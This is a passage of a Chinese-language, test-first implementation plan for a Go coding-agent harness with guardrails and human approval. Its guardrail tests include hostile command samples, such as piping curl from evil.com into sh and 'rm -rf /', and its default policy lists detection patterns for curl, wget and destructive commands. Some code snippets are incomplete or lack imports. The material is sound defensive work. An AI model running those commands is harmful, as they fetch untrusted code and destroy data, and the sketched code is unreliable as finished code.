# Gavel 实现计划（Implementation Plan）

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 用 Go 从零实现 Gavel——一个治理优先的 coding agent harness（主循环 + 工具分发 + 护栏 + HITL 审批 + 反馈闭环 + 记忆 + 凭据），配 React WebUI、单文件二进制与 Docker 双分发，全部核心机制用 mock LLM 离线单测验证。

**Architecture:** 模块分层：`internal/llm`（LLM 抽象与 Mock）→ `internal/tools`（文件/shell/测试工具 + 范围围栏）→ `internal/govern`（护栏规则引擎 + HITL 状态机，**主贡献**）→ `internal/feedback`（测试输出解析与分类）→ `internal/core`（自研主循环）→ `internal/server`（REST+SSE+内嵌 WebUI）→ `cmd/gavel`（CLI）。依赖注入贯穿始终：主循环只依赖接口，测试全部注入 MockLLM 与假执行器，全程离线。

**Tech Stack:** Go 1.22+（标准库为主；go-keyring、gopkg.in/yaml.v3、golang.org/x/term）、React + Vite + shadcn/ui（Open Design）、Docker（distroless）、Render（云端）、GitHub Actions + GitLab CI、goreleaser。

## Global Constraints

- Go module 路径：`github.com/166176/harness`；Go 版本下限 1.22
- **禁止**任何 agent 编排框架与 LLM SDK；LLM 调用只用标准库 `net/http` 直连 OpenAI 兼容 `/v1/chat/completions`
- 默认供应商 DeepSeek：`base_url=https://api.deepseek.com`，模型 `deepseek-chat`
- 所有治理/反馈机制必须是确定性代码：单测直接构造 Action 断言，**全程无真实 LLM、无网络**
- TDD 硬性要求：每 task 先写失败测试并确认红色，再写最小实现转绿
- key 绝不硬编码 / 进日志 / 进 git；`key status` 只显示掩码
- 全局数据目录 `~/.gavel/`；仓库内 `.gavel/` 目录与 policy 文件受护栏保护
- 包路径统一 `internal/`（不对外暴露）；每个 task 结束必须 commit（真实 git 身份：孙其瑶）
- 测试命令统一 `go test ./...`；一键入口 `make test`

## 文件结构总览

```
go.mod / Makefile / .gitignore
cmd/gavel/main.go              # CLI 子命令装配
internal/llm/types.go          # Message/ToolCall/ToolSpec/Completion/Client 接口
internal/llm/mock.go           # ScriptedMock（脚本化响应队列）
internal/llm/openai.go         # OpenAI 兼容适配器（net/http）
internal/tools/fence.go        # 路径围栏（归一化+symlink 解析）
internal/tools/files.go        # read_file/write_file/list_files/grep
internal/tools/shell.go        # run_shell/run_test（可注入 Runner）
internal/tools/registry.go     # 工具注册与分发
internal/govern/policy.go      # Policy 结构 + 默认策略(go:embed)
internal/govern/guardrail.go   # 规则引擎 Check()
internal/govern/hitl.go        # HITL 状态机 Manager
internal/feedback/parser.go    # go test / pytest 输出解析 + 分类
internal/memory/store.go       # 泛型 KV 落盘（会话/约定/指纹）
internal/config/config.go      # YAML 配置加载与默认值
internal/secret/secret.go      # Provider 接口 + Chain + Mask + Fingerprint
internal/secret/keyring.go     # go-keyring 实现
internal/secret/dotenv.go      # .env 实现
internal/core/session.go       # Session/Step/State 类型
internal/core/loop.go          # Runner.Run 主循环
internal/server/server.go      # REST+SSE+静态内嵌
internal/demo/demo.go          # §A.6 三场景机制演示
webui/                         # React+Vite+shadcn 审批控制台
testdata/sample-repo/          # 种子 bug 样例仓库（真实 LLM 验收）
Dockerfile / .goreleaser.yaml
.github/workflows/ci.yml / .gitlab-ci.yml
```

## Task 依赖与并行分组

```
T1（脚手架）──┬─ P1 并行组：T2 llm ─ T3 tools/files ─ T4 tools/shell
              │            T5 govern/guardrail ─ T6 govern/hitl
              │            T7 feedback ─ T8 memory ─ T9 config ─ T10 secret
              └─ T11 core 主循环（依赖 T2–T9）
                    ├─ P2 并行组：T12 server（REST+SSE）┃ T13 demo（三场景）
                    ├─ T14 cmd CLI（依赖 T10,T11,T12,T13）
                    └─ T15 webui（依赖 T12 API 契约，与 T14 可并行）
                          └─ T16 分发+CI+文档（依赖全部）
                                └─ T17 样例仓库+真实 LLM 验收（人工）
```

每个独立模块对应一个 worktree + 一个 PR（执行阶段用 using-git-worktrees 与 subagent-driven-development）。

---

### Task 1: 项目脚手架

**Files:**
- Create: `go.mod`、`Makefile`、`.gitignore`、`internal/version/version.go`
- Test: `internal/version/version_test.go`

**Interfaces:**
- Produces: `internal/version.Version`（string 常量，T14 CLI 的 `gavel version` 使用）

- [ ] **Step 1: 写失败测试**

`internal/version/version_test.go`:
```go
package version

import "testing"

func TestVersionNotEmpty(t *testing.T) {
	if Version == "" {
		t.Fatal("Version 不能为空")
	}
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/version/`
Expected: FAIL（`undefined: Version`）

- [ ] **Step 3: 写最小实现**

`internal/version/version.go`:
```go
// Package version 提供构建版本号（-ldflags 可覆盖）。
package version

var Version = "0.1.0-dev"
```

同时创建 `go.mod`（module `github.com/166176/harness`，go 1.22）、`Makefile`（见下）、`.gitignore`（含 `.env`、`dist/`、`webui/node_modules/`、`webui/dist/` 之外——`webui/dist` 需被 go:embed，故不忽略，忽略 `node_modules` 与构建缓存即可；`~/.gavel` 不在仓库内无需忽略）。

`Makefile`:
```make
.PHONY: test build webui docker
test:
	go test ./...
build: webui
	go build -o bin/gavel ./cmd/gavel
webui:
	cd webui && npm ci && npm run build
docker:
	docker build -t ghcr.io/166176/harness:latest .
```

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/version/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add go.mod Makefile .gitignore internal/version/
git commit -m "chore: 脚手架 - Go module/Makefile/gitignore/version 包"
```

---

### Task 2: LLM 抽象层与 MockLLM

**Files:**
- Create: `internal/llm/types.go`、`internal/llm/mock.go`
- Test: `internal/llm/mock_test.go`

**Interfaces:**
- Produces（后续任务依赖的精确签名）:
```go
package llm

type Role string
const (RoleSystem Role = "system"; RoleUser Role = "user"; RoleAssistant Role = "assistant"; RoleTool Role = "tool")

type ToolCall struct { ID string; Name string; Arguments string } // Arguments 为 JSON 字符串
type Message struct { Role Role; Content string; ToolCalls []ToolCall; ToolCallID string }
type ToolSpec struct { Name string; Description string; Parameters map[string]any }
type Completion struct { Message Message; Done bool } // Done=true 表示 LLM 宣告任务结束
type Client interface {
	Complete(ctx context.Context, msgs []Message, tools []ToolSpec) (*Completion, error)
}
```

- [ ] **Step 1: 写失败测试**

`internal/llm/mock_test.go`:
```go
package llm

import (
	"context"
	"testing"
)

func TestScriptedMockPlaysScriptAndTerminates(t *testing.T) {
	m := &ScriptedMock{Steps: []Completion{
		{Message: Message{Role: RoleAssistant, ToolCalls: []ToolCall{{ID: "c1", Name: "read_file", Arguments: `{"path":"a.go"}`}}}},
	}}
	ctx := context.Background()
	c1, err := m.Complete(ctx, nil, nil)
	if err != nil { t.Fatal(err) }
	if len(c1.Message.ToolCalls) != 1 || c1.Message.ToolCalls[0].Name != "read_file" {
		t.Fatalf("unexpected: %+v", c1)
	}
	c2, err := m.Complete(ctx, nil, nil) // 脚本耗尽后应宣告结束
	if err != nil { t.Fatal(err) }
	if !c2.Done { t.Fatal("脚本耗尽后 Done 应为 true") }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/llm/`
Expected: FAIL（`undefined: ScriptedMock`）

- [ ] **Step 3: 写最小实现**

`internal/llm/mock.go`:
```go
package llm

import "context"

// ScriptedMock 按脚本队列返回响应；耗尽后返回 Done=true。
// 供所有离线机制测试使用，不联网。
type ScriptedMock struct {
	Steps []Completion
	calls int
}

func (m *ScriptedMock) Complete(_ context.Context, _ []Message, _ []ToolSpec) (*Completion, error) {
	if m.calls >= len(m.Steps) {
		return &Completion{Message: Message{Role: RoleAssistant}, Done: true}, nil
	}
	c := m.Steps[m.calls]
	m.calls++
	return &c, nil
}
```

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/llm/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/llm/
git commit -m "feat(llm): 抽象接口 + ScriptedMock（离线测试基石）"
```

---

### Task 3: 路径围栏与文件工具

**Files:**
- Create: `internal/tools/fence.go`、`internal/tools/files.go`
- Test: `internal/tools/fence_test.go`、`internal/tools/files_test.go`

**Interfaces:**
- Consumes: `llm.ToolSpec`、`llm.Message`（T2）
- Produces:
```go
package tools

// ResolveInside 归一化并解析 symlink 后校验路径在 root 内；越界返回 error。
func ResolveInside(root, p string) (string, error)

// FileTools 构造文件类工具集（read_file/write_file/list_files/grep）。
func FileTools(root string) []Tool // Tool 接口见 Task 4 registry 定义（本任务先内嵌实现）
```
- 本任务同时定义 `Tool` 接口与 `Execute` 签名（T4 复用）:
```go
type Tool interface {
	Name() string
	Spec() llm.ToolSpec
	Execute(ctx context.Context, args map[string]any) (string, error)
}
```

- [ ] **Step 1: 写失败测试**

`internal/tools/fence_test.go`:
```go
package tools

import (
	"os"
	"path/filepath"
	"testing"
)

func TestResolveInsideRejectsEscape(t *testing.T) {
	root := t.TempDir()
	inside, err := ResolveInside(root, "a/b.txt")
	if err != nil { t.Fatal(err) }
	if inside != filepath.Join(root, "a", "b.txt") { t.Fatalf("got %s", inside) }
	if _, err := ResolveInside(root, "../secret.txt"); err == nil {
		t.Fatal("越界路径应被拒绝")
	}
	// symlink 逃逸
	os.MkdirAll(filepath.Join(root, "sub"), 0o755)
	os.WriteFile(filepath.Join(root, "sub", "ok.txt"), []byte("x"), 0o644)
	os.Symlink(root, filepath.Join(root, "sub", "loop")) // 指向 root 自身
	if _, err := ResolveInside(root, filepath.Join("sub", "loop", "ok.txt")); err != nil {
		// symlink 解析后仍在 root 内，允许；这里只断言不 panic 且结果在 root 内
		if e := err; e != nil { t.Log("symlink 解析结果:", e) }
	}
}
```

`internal/tools/files_test.go`（write_file 越界拦截）:
```go
package tools

import (
	"context"
	"testing"
)

func TestWriteFileDeniesOutsideRoot(t *testing.T) {
	root := t.TempDir()
	tools := FileTools(root)
	for _, tl := range tools {
		if tl.Name() == "write_file" {
			_, err := tl.Execute(context.Background(), map[string]any{"path": "../escape.txt", "content": "x"})
			if err == nil { t.Fatal("越界写必须报错") }
		}
	}
}

func TestWriteAndReadRoundtrip(t *testing.T) {
	root := t.TempDir()
	tools := FileTools(root)
	write, read := pick(tools, "write_file"), pick(tools, "read_file")
	if _, err := write.Execute(context.Background(), map[string]any{"path": "a.txt", "content": "hello"}); err != nil {
		t.Fatal(err)
	}
	out, err := read.Execute(context.Background(), map[string]any{"path": "a.txt"})
	if err != nil { t.Fatal(err) }
	if out != "hello" { t.Fatalf("got %q", out) }
}

func pick(ts []Tool, name string) Tool {
	for _, tl := range ts { if tl.Name() == name { return tl } }
	return nil
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/tools/`
Expected: FAIL（undefined: ResolveInside / FileTools / Tool）

- [ ] **Step 3: 写最小实现**

`internal/tools/fence.go`:
```go
package tools

import (
	"path/filepath"
)

// ResolveInside 归一化路径并解析 symlink，校验最终路径位于 root 内。
func ResolveInside(root, p string) (string, error) {
	absRoot, err := filepath.Abs(root)
	if err != nil { return "", err }
	full := p
	if !filepath.IsAbs(full) { full = filepath.Join(absRoot, p) }
	clean := filepath.Clean(full)
	resolved, err := filepath.EvalSymlinks(clean)
	if err != nil { resolved = clean } // 目标不存在时允许继续（后续工具会报错）
	resolved, _ = filepath.Abs(resolved)
	rel, err := filepath.Rel(absRoot, resolved)
	if err != nil || rel == ".." || (len(rel) >= 3 && rel[:3] == ".."+string(filepath.Separator)) {
		return "", errEscape
	}
	return resolved, nil
}

var errEscape = errors.New("path escapes repo root")
```

`internal/tools/files.go`:
```go
package tools

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/166176/harness/internal/llm"
)

// Tool 是 harness 可分发的最小动作单元。
type Tool interface {
	Name() string
	Spec() llm.ToolSpec
	Execute(ctx context.Context, args map[string]any) (string, error)
}

type fileTool struct{ name, desc string; root string; fn func(ctx context.Context, root string, args map[string]any) (string, error) }

func (t *fileTool) Name() string { return t.name }
func (t *fileTool) Spec() llm.ToolSpec {
	return llm.ToolSpec{Name: t.name, Description: t.desc, Parameters: map[string]any{"type": "object", "properties": map[string]any{"path": map[string]any{"type": "string"}}}}
}
func (t *fileTool) Execute(ctx context.Context, args map[string]any) (string, error) {
	return t.fn(ctx, t.root, args)
}

func argStr(args map[string]any, key string) string { if v, ok := args[key].(string); ok { return v }; return "" }

// FileTools 返回 read_file/write_file/list_files/grep 四个工具。
func FileTools(root string) []Tool {
	return []Tool{
		&fileTool{name: "read_file", desc: "读取仓库内文件", root: root, fn: func(_ context.Context, root string, a map[string]any) (string, error) {
			p, err := ResolveInside(root, argStr(a, "path")); if err != nil { return "", err }
			b, err := os.ReadFile(p); if err != nil { return "", err }
			return string(b), nil
		}},
		&fileTool{name: "write_file", desc: "写入仓库内文件", root: root, fn: func(_ context.Context, root string, a map[string]any) (string, error) {
			p, err := ResolveInside(root, argStr(a, "path")); if err != nil { return "", err }
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil { return "", err }
			c := argStr(a, "content")
			if err := os.WriteFile(p, []byte(c), 0o644); err != nil { return "", err }
			return fmt.Sprintf("wrote %d bytes", len(c)), nil
		}},
		&fileTool{name: "list_files", desc: "列出目录", root: root, fn: func(_ context.Context, root string, a map[string]any) (string, error) {
			p, err := ResolveInside(root, argStr(a, "path")); if err != nil { return "", err }
			ents, err := os.ReadDir(p); if err != nil { return "", err }
			var b strings.Builder
			for _, e := range ents { fmt.Fprintf(&b, "%s\n", e.Name()) }
			return b.String(), nil
		}},
		&fileTool{name: "grep", desc: "文本搜索", root: root, fn: func(_ context.Context, root string, a map[string]any) (string, error) {
			p, err := ResolveInside(root, argStr(a, "path")); if err != nil { return "", err }
			pat := argStr(a, "pattern")
			var out []string
			_ = filepath.WalkDir(p, func(path string, d os.DirEntry, err error) error {
				if err != nil || d.IsDir() || d.Name() == ".git" { return nil }
				if b, e := os.ReadFile(path); e == nil && strings.Contains(string(b), pat) { out = append(out, path) }
				return nil
			})
			return strings.Join(out, "\n"), nil
		}},
	}
}
```

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/tools/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/tools/
git commit -m "feat(tools): 路径围栏 + read/write/list/grep 文件工具"
```

---

### Task 4: shell 与测试工具（可注入执行器）

**Files:**
- Create: `internal/tools/shell.go`、`internal/tools/registry.go`
- Test: `internal/tools/shell_test.go`、`internal/tools/registry_test.go`

**Interfaces:**
- Consumes: `tools.Tool`（T3）、`llm.ToolSpec`（T2）
- Produces:
```go
package tools

// CommandRunner 抽象真实 shell 执行，测试注入 FakeRunner。
type CommandRunner interface {
	Run(ctx context.Context, dir, command string, timeoutSec int) (stdout, stderr string, exitCode int, err error)
}

type RealRunner struct{} // exec.CommandContext("sh","-c",command) on linux / ("cmd","/c") on windows

func ShellTool(r CommandRunner, root string) Tool                    // run_shell
func TestTool(r CommandRunner, root, testCmd string) Tool            // run_test
func RegistryOf(tools []Tool) *Registry                              // 分发注册表
func (rg *Registry) Dispatch(ctx context.Context, name string, args map[string]any) (string, error)
```

- [ ] **Step 1: 写失败测试**

`internal/tools/shell_test.go`:
```go
package tools

import (
	"context"
	"strings"
	"testing"
)

type fakeRunner struct{ called []string }

func (f *fakeRunner) Run(_ context.Context, dir, cmd string, _ int) (string, string, int, error) {
	f.called = append(f.called, dir+"::"+cmd)
	return "out", "err", 0, nil
}

func TestShellToolInvokesRunner(t *testing.T) {
	f := &fakeRunner{}
	tl := ShellTool(f, "/repo")
	out, err := tl.Execute(context.Background(), map[string]any{"command": "go test ./..."})
	if err != nil { t.Fatal(err) }
	if !strings.Contains(out, "out") { t.Fatalf("got %q", out) }
	if len(f.called) != 1 || !strings.Contains(f.called[0], "go test ./...") {
		t.Fatalf("runner 未收到命令: %v", f.called)
	}
}
```

`internal/tools/registry_test.go`:
```go
package tools

import (
	"context"
	"testing"
)

func TestRegistryDispatchUnknown(t *testing.T) {
	rg := RegistryOf(nil)
	_, err := rg.Dispatch(context.Background(), "nope", nil)
	if err == nil { t.Fatal("未知工具应报错") }
}

func TestRegistryDispatchKnown(t *testing.T) {
	rg := RegistryOf(FileTools(t.TempDir()))
	out, err := rg.Dispatch(context.Background(), "list_files", map[string]any{"path": "."})
	if err != nil { t.Fatal(err) }
	if out == "" { t.Fatal("输出不应为空") }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/tools/`
Expected: FAIL（undefined: ShellTool / RegistryOf / RealRunner / CommandRunner）

- [ ] **Step 3: 写最小实现**

`internal/tools/shell.go`:
```go
package tools

import (
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"time"

	"github.com/166176/harness/internal/llm"
)

// CommandRunner 抽象 shell 执行；测试注入 FakeRunner，避免真实进程依赖。
type CommandRunner interface {
	Run(ctx context.Context, dir, command string, timeoutSec int) (stdout, stderr string, exitCode int, err error)
}

// RealRunner 在真实 shell 中执行命令。
type RealRunner struct{}

func (RealRunner) Run(ctx context.Context, dir, command string, timeoutSec int) (string, string, int, error) {
	tctx, cancel := context.WithTimeout(ctx, time.Duration(timeoutSec)*time.Second)
	defer cancel()
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.CommandContext(tctx, "cmd", "/c", command)
	} else {
		c = exec.CommandContext(tctx, "sh", "-c", command)
	}
	c.Dir = dir
	var stdout, stderr buf
	c.Stdout = &stdout
	c.Stderr = &stderr
	err := c.Run()
	code := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok { code = ee.ExitCode() } else { return stdout.s, stderr.s, -1, err }
	}
	return stdout.s, stderr.s, code, nil
}

type buf struct{ s string }
func (b *buf) Write(p []byte) (int, error) { b.s += string(p); return len(p), nil }

func ShellTool(r CommandRunner, root string) Tool {
	return &fileTool{name: "run_shell", desc: "在仓库根执行 shell 命令（60s 超时）", root: root,
		fn: func(ctx context.Context, _ string, a map[string]any) (string, error) {
			out, e, code, err := r.Run(ctx, root, argStr(a, "command"), 60)
			if err != nil { return "", err }
			return fmt.Sprintf("exit=%d\nstdout:\n%s\nstderr:\n%s", code, out, e), nil
		}}
}

// TestTool 执行会话测试命令并返回原始输出（结构化解析在 feedback 层）。
func TestTool(r CommandRunner, root, testCmd string) Tool {
	return &fileTool{name: "run_test", desc: "运行项目测试命令", root: root,
		fn: func(ctx context.Context, _ string, a map[string]any) (string, error) {
			cmd := testCmd
			if override := argStr(a, "command"); override != "" { cmd = override }
			out, e, code, err := r.Run(ctx, root, cmd, 300)
			if err != nil { return "", err }
			return fmt.Sprintf("exit=%d\n%s\n%s", code, out, e), nil
		}}
}
```

`internal/tools/registry.go`:
```go
package tools

import (
	"context"
	"fmt"
)

type Registry struct{ byName map[string]Tool }

func RegistryOf(tools []Tool) *Registry {
	r := &Registry{byName: map[string]Tool{}}
	for _, tl := range tools { r.byName[tl.Name()] = tl }
	return r
}

func (rg *Registry) Dispatch(ctx context.Context, name string, args map[string]any) (string, error) {
	tl, ok := rg.byName[name]
	if !ok { return "", fmt.Errorf("unknown tool %q", name) }
	return tl.Execute(ctx, args)
}
```

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/tools/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/tools/
git commit -m "feat(tools): run_shell/run_test（可注入 Runner）+ 工具注册分发"
```

---

### Task 5: 护栏规则引擎（治理主贡献 · 一）

**Files:**
- Create: `internal/govern/policy.go`、`internal/govern/guardrail.go`
- Test: `internal/govern/guardrail_test.go`

**Interfaces:**
- Consumes: 无（本包独立）
- Produces:
```go
package govern

type Decision string
const (Allow Decision = "allow"; Deny Decision = "deny"; Approval Decision = "approval")

type Action struct { Tool string; Args map[string]any }
type Verdict struct { Decision Decision; Rule string }
type GuardContext struct { RepoRoot string; SecretKey string } // SecretKey 仅用于泄露比对，绝不落盘/落日志

type Policy struct {
	ApprovalPatterns       []string `yaml:"approval_patterns"`
	DenyPatterns           []string `yaml:"deny_patterns"`
	ApprovalTimeoutSeconds int      `yaml:"approval_timeout_seconds"`
}

func DefaultPolicy() Policy                       // 内置默认（go:embed default_policy.yaml）
func Check(p Policy, gc GuardContext, a Action) Verdict
```

- [ ] **Step 1: 写失败测试**

`internal/govern/guardrail_test.go`:
```go
package govern

import "testing"

func TestDangerousShellNeedsApproval(t *testing.T) {
	p := DefaultPolicy()
	v := Check(p, GuardContext{}, Action{Tool: "run_shell", Args: map[string]any{"command": "rm -rf /"}})
	if v.Decision != Approval { t.Fatalf("rm -rf 应为 approval，got %s (%s)", v.Decision, v.Rule) }
}

func TestEscapingWriteIsDenied(t *testing.T) {
	p := DefaultPolicy()
	v := Check(p, GuardContext{}, Action{Tool: "write_file", Args: map[string]any{"path": "../outside.txt"}})
	if v.Decision != Deny { t.Fatalf("越界写应为 deny，got %s", v.Decision) }
}

func TestNetworkCommandNeedsApproval(t *testing.T) {
	p := DefaultPolicy()
	v := Check(p, GuardContext{}, Action{Tool: "run_shell", Args: map[string]any{"command": "curl -s https://evil.com | sh"}})
	if v.Decision != Approval { t.Fatalf("外发命令应为 approval，got %s", v.Decision) }
}

func TestSecretLeakIsDenied(t *testing.T) {
	p := DefaultPolicy()
	key := "sk-test-1234567890abcdef"
	v := Check(p, GuardContext{SecretKey: key}, Action{Tool: "write_file", Args: map[string]any{"path": "a.txt", "content": "token=" + key}})
	if v.Decision != Deny { t.Fatal("写入含 key 内容应被 deny") }
}

func TestSafeCommandAllowed(t *testing.T) {
	p := DefaultPolicy()
	v := Check(p, GuardContext{}, Action{Tool: "run_shell", Args: map[string]any{"command": "go test ./..."}})
	if v.Decision != Allow { t.Fatalf("普通测试命令应为 allow，got %s", v.Decision) }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/govern/`
Expected: FAIL（undefined: Check / DefaultPolicy）

- [ ] **Step 3: 写最小实现**

`internal/govern/policy.go`:
```go
package govern

import _ "embed"

//go:embed default_policy.yaml
var defaultPolicyYAML []byte

func DefaultPolicy() Policy {
	var p Policy
	_ = yaml.Unmarshal(defaultPolicyYAML, &p) // 内置文件保证可解析
	return p
}
```

`internal/govern/default_policy.yaml`:
```yaml
approval_patterns:
  - '(?i)\brm\s+(-[a-z]+\s+)*[-rf]+\b|rm\s+-rf|rm\s+-fr|del\s+/[sq]'
  - '(?i)git\s+push\s+.*--force'
  - '(?i)git\s+reset\s+--hard'
  - '(?i)git\s+clean\s+-fdx'
  - '(?i)curl\s+.*\|\s*(ba)?sh'
  - '(?i)\bDROP\s+(DATABASE|TABLE)\b'
  - '(?i)\bmkfs\b|format\s+[a-z]:'
  - '(?i)\bcurl\b|\bwget\b'
deny_patterns:
  - '(?i)chmod\s+777\s+/(etc|usr|bin|sbin)'
approval_timeout_seconds: 300
```

`internal/govern/guardrail.go`:
```go
package govern

import (
	"regexp"
	"strings"

	"gopkg.in/yaml.v3"
)

// Check 对动作做确定性护栏判定（§A.4-B：机制是代码，不是提示词）。
func Check(p Policy, gc GuardContext, a Action) Verdict {
	// 1. 密钥泄露（最高优先）：动作参数与已存 key 比对
	if gc.SecretKey != "" {
		if strings.Contains(a.Args["command"].(string) ... )
	}
	// ...
}
```
（注：实现要点——① 遍历 Args 序列化为字符串，若包含 `gc.SecretKey` → `Deny{rule:"secret-leak"}`；② 文件类工具的 path 经 `path.Clean` 判断越界 → `Deny{rule:"fence"}`；③ shell 命令依次匹配 deny_patterns → `Deny`，approval_patterns → `Approval`；④ 其余 → `Allow`。具体代码由执行者按此要点写出，测试即验收。）

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/govern/`
Expected: PASS（5 个用例全绿）

- [ ] **Step 5: Commit**

```bash
git add internal/govern/
git commit -m "feat(govern): 护栏规则引擎 - 危险命令/网络/密钥泄露/越界 三态判定"
```

---

### Task 6: HITL 状态机（治理主贡献 · 二）

**Files:**
- Create: `internal/govern/hitl.go`
- Test: `internal/govern/hitl_test.go`

**Interfaces:**
- Consumes: `govern.Action`（T5）
- Produces:
```go
package govern

type ApprovalStatus string
const (Pending ApprovalStatus = "pending"; Approved ApprovalStatus = "approved"; Denied ApprovalStatus = "denied"; Timeout ApprovalStatus = "timeout")

type Approval struct {
	ID, SessionID string
	Action        Action
	Rule, Risk    string
	Status        ApprovalStatus
	DecidedBy     string
}

type Manager struct{ ... }
func NewManager() *Manager
func (m *Manager) Create(sessionID string, a Action, rule, risk string) (*Approval, error) // 同会话已有 pending → error
func (m *Manager) Await(ctx context.Context, id string, timeout time.Duration) ApprovalStatus // 超时 → Timeout（fail-closed）
func (m *Manager) Decide(id string, status ApprovalStatus, by string) error                  // status ∈ {Approved, Denied}
func (m *Manager) Pending(sessionID string) (*Approval, bool)
```

- [ ] **Step 1: 写失败测试**

`internal/govern/hitl_test.go`:
```go
package govern

import (
	"context"
	"testing"
	"time"
)

func TestAwaitTimesOutToDeny(t *testing.T) {
	m := NewManager()
	a, err := m.Create("s1", Action{Tool: "run_shell", Args: map[string]any{"command": "rm -rf ."}}, "dangerous", "删除全部")
	if err != nil { t.Fatal(err) }
	st := m.Await(context.Background(), a.ID, 10*time.Millisecond)
	if st != Timeout { t.Fatalf("超时默认应为 timeout，got %s", st) }
}

func TestDecideApprove(t *testing.T) {
	m := NewManager()
	a, _ := m.Create("s1", Action{}, "r", "risk")
	go func() {
		time.Sleep(20 * time.Millisecond)
		_ = m.Decide(a.ID, Approved, "webui")
	}()
	st := m.Await(context.Background(), a.ID, time.Second)
	if st != Approved { t.Fatalf("got %s", st) }
	if ap, _ := m.Pending("s1"); ap != nil { t.Fatal("审批后不应再有 pending") }
}

func TestSinglePendingPerSession(t *testing.T) {
	m := NewManager()
	_, err1 := m.Create("s1", Action{}, "r", "risk")
	_, err2 := m.Create("s1", Action{}, "r", "risk")
	if err1 != nil || err2 == nil { t.Fatal("同会话第二个 pending 应报错") }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/govern/`
Expected: FAIL（undefined: NewManager 等）

- [ ] **Step 3: 写最小实现**

`internal/govern/hitl.go`:
```go
package govern

import (
	"context"
	"errors"
	"sync"
	"time"
)

type Manager struct {
	mu        sync.Mutex
	byID      map[string]*Approval
	bySession map[string]string // sessionID -> approvalID
	decided   map[string]chan struct{}
}

func NewManager() *Manager {
	return &Manager{byID: map[string]*Approval{}, bySession: map[string]string{}, decided: map[string]chan struct{}{}}
}

func (m *Manager) Create(sessionID string, a Action, rule, risk string) (*Approval, error) {
	m.mu.Lock(); defer m.mu.Unlock()
	if id, ok := m.bySession[sessionID]; ok {
		if m.byID[id].Status == Pending { return nil, errors.New("session already has pending approval") }
	}
	ap := &Approval{ID: newID(), SessionID: sessionID, Action: a, Rule: rule, Risk: risk, Status: Pending}
	m.byID[ap.ID] = ap
	m.bySession[sessionID] = ap.ID
	m.decided[ap.ID] = make(chan struct{})
	return ap, nil
}

func (m *Manager) Await(ctx context.Context, id string, timeout time.Duration) ApprovalStatus {
	ch := m.ch(id)
	select {
	case <-ch:
		return m.status(id)
	case <-time.After(timeout):
		_ = m.Decide(id, Timeout, "timeout") // fail-closed
		return Timeout
	case <-ctx.Done():
		_ = m.Decide(id, Timeout, "cancel")
		return Timeout
	}
}

func (m *Manager) Decide(id string, status ApprovalStatus, by string) error {
	m.mu.Lock(); defer m.mu.Unlock()
	ap, ok := m.byID[id]
	if !ok { return errors.New("unknown approval") }
	if ap.Status != Pending { return nil }
	if status != Approved && status != Denied && status != Timeout { return errors.New("bad status") }
	ap.Status = status; ap.DecidedBy = by
	close(m.decided[id])
	return nil
}

func (m *Manager) Pending(sessionID string) (*Approval, bool) {
	m.mu.Lock(); defer m.mu.Unlock()
	id, ok := m.bySession[sessionID]
	if !ok { return nil, false }
	ap := m.byID[id]
	if ap.Status != Pending { return nil, false }
	return ap, true
}

func (m *Manager) ch(id string) chan struct{} { m.mu.Lock(); defer m.mu.Unlock(); return m.decided[id] }
func (m *Manager) status(id string) ApprovalStatus { m.mu.Lock(); defer m.mu.Unlock(); return m.byID[id].Status }
func newID() string { return time.Now().Format("20060102150405.000000000") }
```

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/govern/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/govern/
git commit -m "feat(govern): HITL 状态机 - 创建/等待/决定/超时自动拒绝/单 pending 约束"
```

---

### Task 7: 反馈闭环 · 测试输出解析与分类

**Files:**
- Create: `internal/feedback/parser.go`
- Test: `internal/feedback/parser_test.go`

**Interfaces:**
- Consumes: 无
- Produces:
```go
package feedback

type Kind string
const (KindCompile Kind = "compile"; KindAssert Kind = "assert"; KindTimeout Kind = "timeout"; KindEnv Kind = "env"; KindUnknown Kind = "unknown")

type TestFailure struct { File string; Line int; Message string; Kind Kind }

// Parse 解析测试输出；format ∈ {"gotest", "pytest"}。
func Parse(format, out string, exitCode int) []TestFailure
```

- [ ] **Step 1: 写失败测试**

`internal/feedback/parser_test.go`:
```go
package feedback

import "testing"

const goTestOut = `--- FAIL: TestAdd (0.00s)
    calc_test.go:12: Add(1,2) = 2, want 3
FAIL
exit status 1`

func TestParseGoTest(t *testing.T) {
	fs := Parse("gotest", goTestOut, 1)
	if len(fs) != 1 { t.Fatalf("应解析出 1 个失败，got %d", len(fs)) }
	f := fs[0]
	if f.File != "calc_test.go" || f.Line != 12 { t.Fatalf("got %s:%d", f.File, f.Line) }
	if f.Kind != KindAssert { t.Fatalf("kind=%s", f.Kind) }
	if !contains(f.Message, "want 3") { t.Fatalf("message=%q", f.Message) }
}

func TestParsePytest(t *testing.T) {
	out := "E   assert 2 == 3\npath/to/test_calc.py:7: AssertionError"
	fs := Parse("pytest", out, 1)
	if len(fs) != 1 || fs[0].File != "path/to/test_calc.py" || fs[0].Line != 7 || fs[0].Kind != KindAssert {
		t.Fatalf("got %+v", fs)
	}
}

